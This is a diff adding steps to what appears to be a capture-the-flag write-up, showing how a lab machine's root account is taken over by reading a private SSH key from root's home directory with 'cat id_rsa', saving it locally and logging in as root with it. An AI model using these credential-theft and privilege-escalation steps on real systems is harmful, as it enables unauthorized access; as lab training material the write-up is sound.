@@ -174,4 +174,24 @@ sudo -u user2 /bin/bash
 
 This is to gain access to the flag.
 
+Now to get root we go into the root directory.
 
+```cd root```
+
+To see that the flag is there
+```ls```
+
+```cd .shh```
+
+```cat id_rsa```
+And copy the key and save it on our computer as id_rsa.
+
+Now go into the directory where our new id_rsa is and type this
+
+```chmod 600 id_rsa```
+
+Now, lets connect to our root
+
+```ssh root@*ip-adress -p *port -i id_rsa```
+
+Now we have root, and we can just cat our flag.txt file to find the flag.
